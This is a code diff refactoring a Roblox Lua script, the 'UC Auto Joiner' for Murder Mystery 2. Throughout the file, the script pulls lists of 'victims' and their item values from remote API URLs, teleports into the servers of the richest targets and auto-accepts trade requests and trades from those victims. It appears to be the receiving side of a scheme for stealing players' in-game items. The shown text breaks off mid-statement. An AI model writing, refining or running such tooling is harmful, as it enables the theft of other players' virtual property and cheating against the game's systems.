@@ -10,18 +10,31 @@ local UserInputService = v_getservice(game, "UserInputService")
 local ReplicatedStorage = v_getservice(game, "ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
 
-local t_wait, t_spawn, i_new = task.wait, task.spawn, Instance.new
-local s_format, s_lower, s_gsub, s_reverse = string.format, string.lower, string.gsub, string.reverse
-local t_sort, t_insert, t_remove = table.sort, table.insert, table.remove
+local t_wait = task.wait
+local t_spawn = task.spawn
+local i_new = Instance.new
+local s_format = string.format
+local s_lower = string.lower
+local s_gsub = string.gsub
+local s_reverse = string.reverse
+local t_sort = table.sort
+local t_insert = table.insert
+local t_remove = table.remove
+
+local function mul(a, b)
+    return a / (1 / b)
+end
 
 LocalPlayer.Idled:Connect(function()
     VirtualUser:CaptureController()
     VirtualUser:ClickButton2(Vector2.new())
 end)
 
-local FOLDER_NAME, CONFIG_FILE = "CheetosData", "config.json"
+local FOLDER_NAME = "CheetosData"
+local CONFIG_FILE = "config.json"
 local CONFIG_PATH = FOLDER_NAME .. "/" .. CONFIG_FILE
-local CurrentJobId, PlaceId = game.JobId, game.PlaceId
+local CurrentJobId = game.JobId
+local PlaceId = game.PlaceId
 local isMM2 = (PlaceId == 142823291 or PlaceId == 10705210188)
 
 local State = {Victims = {}, LastRefresh = 0, Blacklist = {}, FailedThisCycle = {}, IsTeleporting = false, CurrentTarget = nil, ReceiverActive = false, Gradients = {}}
@@ -32,26 +45,40 @@ local function LoadConfig()
         local s, data = pcall(readfile, CONFIG_PATH)
         if s and data then
             local decoded = HttpService:JSONDecode(data)
-            for k, v in pairs(decoded) do Config[k] = v end
+            for k, v in pairs(decoded) do
+                Config[k] = v
+            end
         end
     end
     if getgenv().JoinerConfig then
-        for k, v in pairs(getgenv().JoinerConfig) do if v ~= nil then Config[k] = v end end
+        for k, v in pairs(getgenv().JoinerConfig) do
+            if v ~= nil then
+                Config[k] = v
+            end
+        end
     end
 end
-LoadConfig()
 
 local function SaveConfig()
-    if not isfolder(FOLDER_NAME) then makefolder(FOLDER_NAME) end
+    if not isfolder(FOLDER_NAME) then
+        makefolder(FOLDER_NAME)
+    end
     pcall(writefile, CONFIG_PATH, HttpService:JSONEncode(Config))
 end
 
-if CoreGui:FindFirstChild("CheetosJoinerUI") then CoreGui.CheetosJoinerUI:Destroy() end
+t_spawn(LoadConfig)
+
+if CoreGui:FindFirstChild("CheetosJoinerUI") then
+    CoreGui.CheetosJoinerUI:Destroy()
+end
+
 local ScreenGui = i_new("ScreenGui", CoreGui)
 ScreenGui.Name = "CheetosJoinerUI"
 ScreenGui.ResetOnSpawn = false
 
-local function s(val) return val * 0.5 end
+local function s(val)
+    return val / 2
+end
 
 local function applyLedEffect(element, scaleFunc)
     local ledStroke = i_new("UIStroke", element)
@@ -68,7 +95,9 @@ end
 
 RunService.RenderStepped:Connect(function()
     local offset = Vector2.new(tick() % 2 - 1, 0)
-    for i = 1, #State.Gradients do State.Gradients[i].Offset = offset end
+    for i = 1, #State.Gradients do
+        State.Gradients[i].Offset = offset
+    end
 end)
 
 local function formatValue(v)
@@ -80,8 +109,10 @@ MainFrame.Size = UDim2.new(0, s(500), 0, s(350))
 MainFrame.Position = UDim2.new(0.5, s(-250), 0, s(10)) 
 MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
 MainFrame.BackgroundTransparency = 0.1
-MainFrame.Active, MainFrame.Draggable = true, true
-i_new("UICorner", MainFrame).CornerRadius = UDim.new(0, s(8))
+MainFrame.Active = true
+MainFrame.Draggable = true
+local mainCorner = i_new("UICorner", MainFrame)
+mainCorner.CornerRadius = UDim.new(0, s(8))
 applyLedEffect(MainFrame, s)
 
 local InnerFrame = i_new("Frame", MainFrame)
@@ -98,24 +129,30 @@ TitleLabel.Size = UDim2.new(1, 0, 1, 0)
 TitleLabel.BackgroundTransparency = 1
 TitleLabel.Text = "UC Auto Joiner (MM2 Only)"
 TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TitleLabel.Font, TitleLabel.TextSize = Enum.Font.GothamBold, s(18)
+TitleLabel.Font = Enum.Font.GothamBold
+TitleLabel.TextSize = s(18)
 TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
 
 local MinimizeBtn = i_new("TextButton", TitleBar)
 MinimizeBtn.Size = UDim2.new(0, s(30), 0, s(30))
 MinimizeBtn.Position = UDim2.new(1, -s(30), 0, 0)
 MinimizeBtn.BackgroundTransparency = 1
-MinimizeBtn.Text, MinimizeBtn.TextColor3 = "-", Color3.fromRGB(255, 255, 255)
-MinimizeBtn.Font, MinimizeBtn.TextSize = Enum.Font.GothamBold, s(24)
+MinimizeBtn.Text = "-"
+MinimizeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+MinimizeBtn.Font = Enum.Font.GothamBold
+MinimizeBtn.TextSize = s(24)
 
 local ToggleHandle = i_new("TextButton", ScreenGui)
 ToggleHandle.Size = UDim2.new(0, s(100), 0, s(30))
 ToggleHandle.Position = UDim2.new(0.5, s(-50), 0, 0)
 ToggleHandle.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-ToggleHandle.Text = "▼"
-ToggleHandle.Font, ToggleHandle.TextColor3, ToggleHandle.TextSize = Enum.Font.GothamBold, Color3.fromRGB(255, 255, 255), s(20)
+ToggleHandle.Text = "V"
+ToggleHandle.Font = Enum.Font.GothamBold
+ToggleHandle.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleHandle.TextSize = s(20)
 ToggleHandle.Visible = false 
-i_new("UICorner", ToggleHandle).CornerRadius = UDim.new(0, s(6))
+local toggleCorner = i_new("UICorner", ToggleHandle)
+toggleCorner.CornerRadius = UDim.new(0, s(6))
 applyLedEffect(ToggleHandle, s)
 
 local function toggleGUI(show)
@@ -123,16 +160,23 @@ local function toggleGUI(show)
     TweenService:Create(MainFrame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = targetPos}):Play()
     ToggleHandle.Visible = not show
 end
-MinimizeBtn.MouseButton1Click:Connect(function() toggleGUI(false) end)
-ToggleHandle.MouseButton1Click:Connect(function() toggleGUI(true) end)
+
+MinimizeBtn.MouseButton1Click:Connect(function()
+    toggleGUI(false)
+end)
+
+ToggleHandle.MouseButton1Click:Connect(function()
+    toggleGUI(true)
+end)
 
 local TabFrame = i_new("Frame", InnerFrame)
 TabFrame.Size = UDim2.new(1, 0, 0, s(30))
 TabFrame.Position = UDim2.new(0, 0, 0, s(40))
 TabFrame.BackgroundTransparency = 1
-i_new("UIListLayout", TabFrame).FillDirection = Enum.FillDirection.Horizontal
-TabFrame.UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
-TabFrame.UIListLayout.Padding = UDim.new(0, s(5))
+local tabLayout = i_new("UIListLayout", TabFrame)
+tabLayout.FillDirection = Enum.FillDirection.Horizontal
+tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+tabLayout.Padding = UDim.new(0, s(5))
 
 local ContentFrame = i_new("Frame", InnerFrame)
 ContentFrame.Size = UDim2.new(1, 0, 1, s(-80))
@@ -140,19 +184,26 @@ ContentFrame.Position = UDim2.new(0, 0, 0, s(75))
 ContentFrame.BackgroundTransparency = 1
 
 local Tabs = {"Targets", "Settings", "Status"}
-local TabButtons, Pages = {}, {}
+local TabButtons = {}
+local Pages = {}
+
 for i, tabName in ipairs(Tabs) do
     local btn = i_new("TextButton", TabFrame)
     btn.Size = UDim2.new(0, s(100), 1, 0)
     btn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
     btn.BackgroundTransparency = 0.8
-    btn.Font, btn.Text, btn.TextSize = Enum.Font.GothamSemibold, tabName, s(14)
+    btn.Font = Enum.Font.GothamSemibold
+    btn.Text = tabName
+    btn.TextSize = s(14)
     btn.TextColor3 = Color3.fromRGB(200, 200, 200)
-    i_new("UICorner", btn).CornerRadius = UDim.new(0, s(6))
+    local btnCorner = i_new("UICorner", btn)
+    btnCorner.CornerRadius = UDim.new(0, s(6))
     applyLedEffect(btn, s)
     TabButtons[tabName] = btn
+    
     local page = i_new("Frame", ContentFrame)
-    page.Size, page.BackgroundTransparency = UDim2.new(1, 0, 1, 0), 1
+    page.Size = UDim2.new(1, 0, 1, 0)
+    page.BackgroundTransparency = 1
     page.Visible = (i == 1)
     Pages[tabName] = page
 end
@@ -165,55 +216,99 @@ local function switchTab(target)
         Pages[name].Visible = active
     end
 end
-for name, btn in pairs(TabButtons) do btn.MouseButton1Click:Connect(function() switchTab(name) end) end
+
+for name, btn in pairs(TabButtons) do
+    btn.MouseButton1Click:Connect(function()
+        switchTab(name)
+    end)
+end
 
 local Container = i_new("ScrollingFrame", Pages.Targets)
-Container.Size, Container.BackgroundTransparency, Container.BorderSizePixel = UDim2.new(1, 0, 1, 0), 1, 0
-Container.ScrollBarThickness, Container.CanvasSize = s(4), UDim2.new(0, 0, 0, 0)
-i_new("UIListLayout", Container).Padding = UDim.new(0, s(8))
+Container.Size = UDim2.new(1, 0, 1, 0)
+Container.BackgroundTransparency = 1
+Container.BorderSizePixel = 0
+Container.ScrollBarThickness = s(4)
+Container.CanvasSize = UDim2.new(0, 0, 0, 0)
+local containerLayout = i_new("UIListLayout", Container)
+containerLayout.Padding = UDim.new(0, s(8))
 
-i_new("UIListLayout", Pages.Settings).Padding = UDim.new(0, s(10))
+local settingsLayout = i_new("UIListLayout", Pages.Settings)
+settingsLayout.Padding = UDim.new(0, s(10))
+
 local function createToggle(parent, text, key)
     local frame = i_new("Frame", parent)
-    frame.Size, frame.BackgroundTransparency = UDim2.new(1, 0, 0, s(40)), 1
+    frame.Size = UDim2.new(1, 0, 0, s(40))
+    frame.BackgroundTransparency = 1
+    
     local label = i_new("TextLabel", frame)
-    label.Size, label.BackgroundTransparency = UDim2.new(0.6, 0, 1, 0), 1
-    label.Font, label.TextColor3, label.Text = Enum.Font.Gotham, Color3.fromRGB(255, 255, 255), text
-    label.TextXAlignment, label.TextSize = Enum.TextXAlignment.Left, s(14)
+    label.Size = UDim2.new(0.6, 0, 1, 0)
+    label.BackgroundTransparency = 1
+    label.Font = Enum.Font.Gotham
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.Text = text
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.TextSize = s(14)
+    
     local bg = i_new("TextButton", frame)
-    bg.Size, bg.Position = UDim2.new(0, s(60), 0, s(30)), UDim2.new(1, s(-60), 0.5, s(-15))
-    bg.BackgroundColor3, bg.Text = Color3.fromRGB(255, 255, 255), ""
+    bg.Size = UDim2.new(0, s(60), 0, s(30))
+    bg.Position = UDim2.new(1, s(-60), 0.5, s(-15))
+    bg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    bg.Text = ""
     bg.BackgroundTransparency = Config[key] and 0.6 or 0.8
-    i_new("UICorner", bg).CornerRadius = UDim.new(0, s(12))
+    local bgCorner = i_new("UICorner", bg)
+    bgCorner.CornerRadius = UDim.new(0, s(12))
     applyLedEffect(bg, s)
+    
     local knob = i_new("Frame", bg)
-    knob.Size, knob.BackgroundColor3 = UDim2.new(0, s(20), 0, s(20)), Color3.fromRGB(255, 255, 255)
+    knob.Size = UDim2.new(0, s(20), 0, s(20))
+    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
     knob.Position = Config[key] and UDim2.new(1, s(-25), 0.5, s(-10)) or UDim2.new(0, s(5), 0.5, s(-10))
-    i_new("UICorner", knob).CornerRadius = UDim.new(1, 0)
+    local knobCorner = i_new("UICorner", knob)
+    knobCorner.CornerRadius = UDim.new(1, 0)
+    
     bg.MouseButton1Click:Connect(function()
         Config[key] = not Config[key]
         bg.BackgroundTransparency = Config[key] and 0.6 or 0.8
-        TweenService:Create(knob, TweenInfo.new(0.2), {Position = Config[key] and UDim2.new(1, s(-25), 0.5, s(-10)) or UDim2.new(0, s(5), 0.5, s(-10))}):Play()
+        local targetPos = Config[key] and UDim2.new(1, s(-25), 0.5, s(-10)) or UDim2.new(0, s(5), 0.5, s(-10))
+        TweenService:Create(knob, TweenInfo.new(0.2), {Position = targetPos}):Play()
         SaveConfig()
     end)
 end
 
 local function createInput(parent, text, key)
     local frame = i_new("Frame", parent)
-    frame.Size, frame.BackgroundTransparency = UDim2.new(1, 0, 0, s(40)), 1
+    frame.Size = UDim2.new(1, 0, 0, s(40))
+    frame.BackgroundTransparency = 1
+    
     local label = i_new("TextLabel", frame)
-    label.Size, label.BackgroundTransparency = UDim2.new(0.6, 0, 1, 0), 1
-    label.Font, label.TextColor3, label.Text = Enum.Font.Gotham, Color3.fromRGB(255, 255, 255), text
-    label.TextXAlignment, label.TextSize = Enum.TextXAlignment.Left, s(14)
+    label.Size = UDim2.new(0.6, 0, 1, 0)
+    label.BackgroundTransparency = 1
+    label.Font = Enum.Font.Gotham
+    label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    label.Text = text
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.TextSize = s(14)
+    
     local box = i_new("TextBox", frame)
-    box.Size, box.Position = UDim2.new(0, s(60), 0, s(30)), UDim2.new(1, s(-60), 0.5, s(-15))
-    box.BackgroundColor3, box.TextColor3 = Color3.fromRGB(40, 40, 40), Color3.fromRGB(255, 255, 255)
-    box.Text, box.Font, box.TextSize = tostring(Config[key]), Enum.Font.Gotham, s(14)
-    i_new("UICorner", box).CornerRadius = UDim.new(0, s(6))
+    box.Size = UDim2.new(0, s(60), 0, s(30))
+    box.Position = UDim2.new(1, s(-60), 0.5, s(-15))
+    box.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    box.TextColor3 = Color3.fromRGB(255, 255, 255)
+    box.Text = tostring(Config[key])
+    box.Font = Enum.Font.Gotham
+    box.TextSize = s(14)
+    local boxCorner = i_new("UICorner", box)
+    boxCorner.CornerRadius = UDim.new(0, s(6))
     applyLedEffect(box, s)
+    
     box.FocusLost:Connect(function()
         local n = tonumber(box.Text)
-        if n then Config[key] = n; SaveConfig() else box.Text = tostring(Config[key]) end
+        if n then
+            Config[key] = n
+            SaveConfig()
+        else
+            box.Text = tostring(Config[key])
+        end
     end)
 end
 
@@ -221,22 +316,35 @@ createToggle(Pages.Settings, "Auto Join", "AutoJoin")
 createInput(Pages.Settings, "Min Value", "MinTargetValue")
 createInput(Pages.Settings, "Target Index", "TargetIndex")
 
-i_new("UIListLayout", Pages.Status).Padding = UDim.new(0, s(5))
+local statusLayout = i_new("UIListLayout", Pages.Status)
+statusLayout.Padding = UDim.new(0, s(5))
+
 local function createStatusLabel(text)
     local label = i_new("TextLabel", Pages.Status)
-    label.Size, label.BackgroundTransparency = UDim2.new(1, 0, 0, s(30)), 1
-    label.Font, label.TextColor3, label.Text = Enum.Font.Gotham, Color3.fromRGB(200, 200, 200), text
-    label.TextXAlignment, label.TextSize = Enum.TextXAlignment.Left, s(14)
+    label.Size = UDim2.new(1, 0, 0, s(30))
+    label.BackgroundTransparency = 1
+    label.Font = Enum.Font.Gotham
+    label.TextColor3 = Color3.fromRGB(200, 200, 200)
+    label.Text = text
+    label.TextXAlignment = Enum.TextXAlignment.Left
+    label.TextSize = s(14)
     return label
 end
+
 local MainStatus = createStatusLabel("Status: Initializing...")
 local HitsLabel = createStatusLabel("Available Hits: 0")
 local TopHitLabel = createStatusLabel("Top Target: None")
-local function setStatus(msg) MainStatus.Text = "Status: " .. msg end
+
+local function setStatus(msg)
+    MainStatus.Text = "Status: " .. msg
+end
 
 TeleportService.TeleportInitFailed:Connect(function(player, result, errorMessage)
     if result == Enum.TeleportResult.GameFull or result == Enum.TeleportResult.ServerFull then
-        if State.LastAttemptedJob then State.FailedThisCycle[State.LastAttemptedJob] = true; setStatus("Full - Skipping") end
+        if State.LastAttemptedJob then
+            State.FailedThisCycle[State.LastAttemptedJob] = true
+            setStatus("Full - Skipping")
+        end
     end
 end)
 
@@ -256,21 +364,32 @@ local function parsePlaceId(link)
 end
 
 if isMM2 then
-    task.spawn(function()
+    t_spawn(function()
         local remotes = ReplicatedStorage:WaitForChild("Remotes")
         local loadedRemote = remotes:WaitForChild("Extras"):WaitForChild("LoadedCompletely")
         while true do
             local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
             if PlayerGui then
                 local guiNames = {"Loading", "DeviceSelect", "Join", "JoinPhone"}
-                for _, name in ipairs(guiNames) do local screen = PlayerGui:FindFirstChild(name) if screen then screen:Destroy() end end
+                for _, name in ipairs(guiNames) do
+                    local screen = PlayerGui:FindFirstChild(name)
+                    if screen then
+                        screen:Destroy()
+                    end
+                end
                 PlayerGui:SetAttribute("Device", "PC")
                 if not PlayerGui:FindFirstChild("MainGUI") then
                     local gf = ReplicatedStorage:FindFirstChild("GUI")
                     local mainGui = gf and (gf:FindFirstChild("MainPC") or gf:FindFirstChild("MainMobile"))
-                    if mainGui then local c = mainGui:Clone() c.Name = "MainGUI"; c.Parent = PlayerGui end
+                    if mainGui then
+                        local c = mainGui:Clone()
+                        c.Name = "MainGUI"
+                        c.Parent = PlayerGui
+                    end
                 end
-                pcall(function() game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
+                pcall(function()
+                    game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+                end)
                 loadedRemote:FireServer()
             end
             t_wait(0.1)
@@ -280,22 +399,45 @@ end
 
 local function createRow(victim)
     local Row = i_new("Frame", Container)
-    Row.Size, Row.BackgroundColor3, Row.BackgroundTransparency = UDim2.new(1, 0, 0, s(60)), Color3.fromRGB(40, 40, 45), 0.3
-    i_new("UICorner", Row).CornerRadius = UDim.new(0, s(6))
+    Row.Size = UDim2.new(1, 0, 0, s(60))
+    Row.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+    Row.BackgroundTransparency = 0.3
+    local rowCorner = i_new("UICorner", Row)
+    rowCorner.CornerRadius = UDim.new(0, s(6))
     applyLedEffect(Row, s)
+    
     local NameLbl = i_new("TextLabel", Row)
-    NameLbl.Text, NameLbl.Font, NameLbl.TextSize, NameLbl.TextColor3 = victim.victim, Enum.Font.GothamBold, s(16), Color3.fromRGB(255, 255, 255)
-    NameLbl.Position, NameLbl.Size, NameLbl.BackgroundTransparency = UDim2.new(0, s(10), 0, s(5)), UDim2.new(0.5, 0, 0.5, 0), 1
+    NameLbl.Text = victim.victim
+    NameLbl.Font = Enum.Font.GothamBold
+    NameLbl.TextSize = s(16)
+    NameLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+    NameLbl.Position = UDim2.new(0, s(10), 0, s(5))
+    NameLbl.Size = UDim2.new(0.5, 0, 0.5, 0)
+    NameLbl.BackgroundTransparency = 1
     NameLbl.TextXAlignment = Enum.TextXAlignment.Left
+    
     local ValLbl = i_new("TextLabel", Row)
-    ValLbl.Text, ValLbl.Font, ValLbl.TextSize, ValLbl.TextColor3 = "RAP: " .. formatValue(victim.val), Enum.Font.Gotham, s(14), Color3.fromRGB(100, 255, 100)
-    ValLbl.Position, ValLbl.Size, ValLbl.BackgroundTransparency = UDim2.new(0, s(10), 0.5, 0), UDim2.new(0.5, 0, 0.5, 0), 1
+    ValLbl.Text = "RAP: " .. formatValue(victim.val)
+    ValLbl.Font = Enum.Font.Gotham
+    ValLbl.TextSize = s(14)
+    ValLbl.TextColor3 = Color3.fromRGB(100, 255, 100)
+    ValLbl.Position = UDim2.new(0, s(10), 0.5, 0)
+    ValLbl.Size = UDim2.new(0.5, 0, 0.5, 0)
+    ValLbl.BackgroundTransparency = 1
     ValLbl.TextXAlignment = Enum.TextXAlignment.Left
+    
     local JoinBtn = i_new("TextButton", Row)
-    JoinBtn.Size, JoinBtn.Position, JoinBtn.BackgroundColor3 = UDim2.new(0.2, 0, 0.6, 0), UDim2.new(0.55, 0, 0.2, 0), Color3.fromRGB(60, 60, 255)
-    JoinBtn.Text, JoinBtn.Font, JoinBtn.TextColor3, JoinBtn.TextSize = "JOIN", Enum.Font.GothamBold, Color3.fromRGB(255, 255, 255), s(14)
-    i_new("UICorner", JoinBtn).CornerRadius = UDim.new(0, s(6))
+    JoinBtn.Size = UDim2.new(0.2, 0, 0.6, 0)
+    JoinBtn.Position = UDim2.new(0.55, 0, 0.2, 0)
+    JoinBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 255)
+    JoinBtn.Text = "JOIN"
+    JoinBtn.Font = Enum.Font.GothamBold
+    JoinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    JoinBtn.TextSize = s(14)
+    local btnCorner = i_new("UICorner", JoinBtn)
+    btnCorner.CornerRadius = UDim.new(0, s(6))
     applyLedEffect(JoinBtn, s)
+    
     JoinBtn.MouseButton1Click:Connect(function()
         local jId = parseJobId(victim.link)
         if jId then 
@@ -307,66 +449,100 @@ end
 
 local function refreshList()
     for _, c in ipairs(Container:GetChildren()) do 
-        if not c:IsA("UIListLayout") then c:Destroy() end 
+        if not c:IsA("UIListLayout") then
+            c:Destroy()
+        end 
     end
+    
     local displayList = {}
     for _, v in ipairs(State.Victims) do
         if tonumber(v.val) and tonumber(v.val) > 0 then
             t_insert(displayList, v)
         end
     end
+    
     t_sort(displayList, function(a, b) 
         return (tonumber(a.val) or 0) > (tonumber(b.val) or 0) 
     end)
-    HitsLabel.Text = "Available Hits: " .. #displayList
+    
+    HitsLabel.Text = "Available Hits: " .. tostring(#displayList)
+    
     if #displayList == 0 then
         local el = i_new("TextLabel", Container)
-        el.Text, el.Size, el.BackgroundTransparency, el.TextColor3 = "No Active Targets", UDim2.new(1, 0, 0, s(40)), 1, Color3.fromRGB(150, 150, 150)
-        el.Font, el.TextSize = Enum.Font.Gotham, s(14)
-    else 
-        for _, v in ipairs(displayList) do createRow(v) end 
+        el.Text = "No Active Targets"
+        el.Size = UDim2.new(1, 0, 0, s(40))
+        el.BackgroundTransparency = 1
+        el.TextColor3 = Color3.fromRGB(150, 150, 150)
+        el.Font = Enum.Font.Gotham
+        el.TextSize = s(14)
+    else
+        local maxDisplay = 50
+        if #displayList < maxDisplay then
+            maxDisplay = #displayList
+        end
+        for i = 1, maxDisplay do
+            createRow(displayList[i])
+        end 
     end
-    Container.CanvasSize = UDim2.new(0, 0, 0, #displayList * s(70))
+    Container.CanvasSize = UDim2.new(0, 0, 0, mul(#displayList, s(70)))
 end
 
 local function fetchVictims()
     local all = {}
     local sources = Config.ApiUrls or {}
-    if (not sources or not next(sources)) and Config.ApiUrl ~= "" then sources = {Config.ApiUrl} end
+    if (not sources or not next(sources)) and Config.ApiUrl ~= "" then
+        sources = {Config.ApiUrl}
+    end
+    
     for _, url in pairs(sources) do
         if url and url ~= "" then
-            local s, res = pcall(function() return HttpService:JSONDecode(game:HttpGet(url:gsub("http://", "https://") .. "?t=" .. os.time())) end)
+            local s, res = pcall(function()
+                return HttpService:JSONDecode(game:HttpGet(url:gsub("http://", "https://") .. "?t=" .. tostring(os.time())))
+            end)
             if s and type(res) == "table" then
-                for _, v in ipairs(res) do if tostring(v.link):find("142823291") or tostring(v.link):find("10705210188") then t_insert(all, v) end end
+                for _, v in ipairs(res) do
+                    if tostring(v.link):find("142823291") or tostring(v.link):find("10705210188") then
+                        t_insert(all, v)
+                    end
+                end
             end
         end
     end
+    
     State.Victims = all
     refreshList()
-    setStatus("Synced: " .. #State.Victims)
+    setStatus("Synced: " .. tostring(#State.Victims))
 end
 
 local function AutoJoinStep()
     if not Config.AutoJoin or State.IsTeleporting or State.ReceiverActive then return end
-    t_sort(State.Victims, function(a, b) return (tonumber(a.val) or 0) > (tonumber(b.val) or 0) end)
-    local mv = tonumber(Config.MinTargetValue) or 0
     
-    local foundInServer = false
+    local mv = tonumber(Config.MinTargetValue) or 0
+    local validVictims = {}
+    
     for _, v in ipairs(State.Victims) do
         if tonumber(v.val) >= mv then
-            local job = parseJobId(v.link)
-            if job == CurrentJobId and Players:FindFirstChild(v.victim) then
-                foundInServer = true
-                setStatus("Locked on: " .. v.victim)
-                TopHitLabel.Text = "Farming: " .. v.victim
-                State.CurrentTarget = v; State.FailedThisCycle = {}
-                return
-            end
+            t_insert(validVictims, v)
         end
     end
     
+    t_sort(validVictims, function(a, b)
+        return (tonumber(a.val) or 0) > (tonumber(b.val) or 0)
+    end)
+    
     State.CurrentTarget = nil
     TopHitLabel.Text = "Farming: None"
+    
+    for _, v in ipairs(validVictims) do
+        local job = parseJobId(v.link)
+        if job == CurrentJobId and Players:FindFirstChild(v.victim) then
+            setStatus("Locked on: " .. v.victim)
+            TopHitLabel.Text = "Farming: " .. v.victim
+            State.CurrentTarget = v
+            State.FailedThisCycle = {}
+            return
+        end
+    end
     
     if #Players:GetPlayers() > 1 then
         setStatus("Looted Server - Searching...")
@@ -374,85 +550,120 @@ local function AutoJoinStep()
 
     local si = Config.TargetIndex or 1
     local found = false
-    for i = si, #State.Victims do
-        local t = State.Victims[i]
-        if tonumber(t.val) >= mv then
-            local j = parseJobId(t.link)
-            if j and j ~= CurrentJobId then
-                found = true
-                if not State.FailedThisCycle[j] then
-                    State.CurrentTarget = t
-                    setStatus("Chasing #"..i); SafeTeleport(tonumber(parsePlaceId(t.link) or 142823291), j)
-                    return
-                end
+    
+    for i = si, #validVictims do
+        local t = validVictims[i]
+        local j = parseJobId(t.link)
+        if j and j ~= CurrentJobId then
+            found = true
+            if not State.FailedThisCycle[j] then
+                State.CurrentTarget = t
+                setStatus("Chasing #" .. tostring(i))
+                SafeTeleport(tonumber(parsePlaceId(t.link) or 142823291), j)
+                return
             end
         end
     end
-    if found then setStatus("Cycle Finished - Resetting"); State.FailedThisCycle = {} end
-end
-
-function startReceiver()
-    if isMM2 then
-        task.spawn(function()
-            local function mm2Main()
-                local Trade = ReplicatedStorage:WaitForChild("Trade", 20)
-                if not Trade then return end
-                local function isV(p)
-                    if not p then return false end
-                    local n = s_lower(p.Name)
-                    for _, v in ipairs(State.Victims) do if n:find(s_lower(v.victim)) then return true end end
-                    return false
-                end
-                local function accept(tn)
-                    State.ReceiverActive = true
-                    local st = tick()
-                    while tick() - st < 3 do
-                        Trade.AcceptRequest:FireServer()
-                        local s, res = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
-                        if s and res == "StartTrade" then break end
-                        t_wait(0.1)
-                    end
-                end
-                t_spawn(function()
-                    while true do
-                        local s, res = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
-                        if s and res == "ReceivingRequest" then Trade.AcceptRequest:FireServer(); State.ReceiverActive = true end
-                        t_wait(0.5)
-                    end
-                end)
-                t_spawn(function()
-                    while true do
-                        pcall(function()
-                            local sr = Trade:FindFirstChild("SendRequest")
-                            if sr then sr.OnClientInvoke = function(s) if isV(s) then accept(s.Name); return true end; Trade.DeclineRequest:FireServer(); return false end end
-                            Trade.SetRequestsEnabled:FireServer(true)
-                        end)
-                        t_wait(1)
-                    end
-                end)
-                local lov, ctid = 0, 428469873
-                Trade.UpdateTrade.OnClientEvent:Connect(function(d) if d then lov = d.LastOffer or lov; ctid = d.TradeId or ctid end end)
-                while true do
-                    local s, res = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
-                    if s and res == 'StartTrade' then
-                        State.ReceiverActive = true
-                        while true do
-                            Trade.AcceptTrade:FireServer(ctid, lov)
-                            t_wait(0.1)
-                            local s2, cur = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
-                            if not s2 or cur ~= 'StartTrade' then break end
-                        end
-                    end
-                    State.ReceiverActive = false
-                    t_wait(0.5)
-                end
-            end
-            while true do pcall(mm2Main); t_wait(2) end
-        end)
+    
+    if found then
+        setStatus("Cycle Finished - Resetting")
+        State.FailedThisCycle = {}
     end
 end
 
-t_spawn(function() while true do fetchVictims(); t_wait(Config.RefreshRate or 1) end end)
-t_spawn(function() while true do AutoJoinStep(); t_wait(1) end end)
+local function startReceiver()
+    if not isMM2 then return end
+    
+    t_spawn(function()
+        local Trade = ReplicatedStorage:WaitForChild("Trade", 20)
+        if not Trade then return end
+        
+        local function isV(p)
+            if not p then return false end
+            local n = s_lower(p.Name)
+            for _, v in ipairs(State.Victims) do
+                if string.find(n, s_lower(v.victim)) then return true end
+            end
+            return false
+        end
+        
+        t_spawn(function()
+            while true do
+                local s, res = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
+                if s and res == "ReceivingRequest" then
+                    Trade.AcceptRequest:FireServer()
+                    State.ReceiverActive = true
+                end
+                t_wait(0.5)
+            end
+        end)
+        
+        t_spawn(function()
+            while true do
+                pcall(function()
+                    local sr = Trade:FindFirstChild("SendRequest")
+                    if sr then
+                        sr.OnClientInvoke = function(s)
+                            if isV(s) then
+                                t_spawn(function()
+                                    State.ReceiverActive = true
+                                    local st = tick()
+                                    while tick() - st < 3 do
+                                        Trade.AcceptRequest:FireServer()
+                                        local s2, res2 = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
+                                        if s2 and res2 == "StartTrade" then break end
+                                        t_wait(0.1)
+                                    end
+                                end)
+                                return true
+                            end
+                            Trade.DeclineRequest:FireServer()
+                            return false
+                        end
+                    end
+                    Trade.SetRequestsEnabled:FireServer(true)
+                end)
+                t_wait(1)
+            end
+        end)
+        
+        t_spawn(function()
+            local lov = 0
+            local ctid = 428469873
+            Trade.UpdateTrade.OnClientEvent:Connect(function(d)
+                if d then
+                    lov = d.LastOffer or lov
+                    ctid = d.TradeId or ctid
+                end
+            end)
+            
+            while true do
+                local s, res = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
+                if s and res == 'StartTrade' then
+                    State.ReceiverActive = true
+                    Trade.AcceptTrade:FireServer(ctid, lov)
+                else
+                    State.ReceiverActive = false
+                end
+                t_wait(0.5)
+            end
+        end)
+    end)
+end
+
+t_spawn(function()
+    while true do
+        fetchVictims()
+        t_wait(Config.RefreshRate or 1)
+    end
+end)
+
+t_spawn(function()
